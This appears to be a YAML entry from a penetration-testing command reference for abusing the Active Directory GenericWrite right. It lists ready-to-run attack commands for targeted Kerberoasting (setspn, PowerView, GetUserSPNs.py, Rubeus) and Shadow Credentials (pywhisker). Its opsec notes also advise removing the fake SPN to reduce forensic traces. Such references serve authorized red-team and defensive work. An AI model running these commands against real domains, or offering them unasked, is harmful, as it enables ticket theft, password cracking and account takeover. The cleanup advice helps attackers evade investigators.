name: GenericWrite
description: Write to non-protected attributes - can set SPN or script path
commands:
- '# Targeted Kerberoasting - Method 1: setspn (Windows)'
- setspn -a HTTP/fakeserver.<DOMAIN> <TARGET_USER>
- GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<YOUR_USER>:<YOUR_PASSWORD>' -request-user '<TARGET_USER>'
- setspn -d HTTP/fakeserver.<DOMAIN> <TARGET_USER>
- ''
- '# Targeted Kerberoasting - Method 2: PowerView (Windows)'
- Set-DomainObject -Identity '<TARGET_USER>' -Set @{serviceprincipalname='fake/TempSvc'}
- Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap
- Set-DomainObject -Identity '<TARGET_USER>' -Clear serviceprincipalname
- ''
- '# Shadow Credentials (if AD CS is present)'
- pywhisker.py -d '<DOMAIN>' -u '<YOUR_USER>' -p '<YOUR_PASSWORD>' --target '<TARGET_USER>' --action add
opsec:
- SPN modifications trigger event 5136 (directory object modified)
- Clean up fake SPN after exploitation to reduce forensic artifacts
- Shadow Credentials leave msDS-KeyCredentialLink modifications
references:
- https://attack.mitre.org/techniques/T1558/003/
- https://www.thehacker.recipes/ad/movement/kerberos/kerberoast
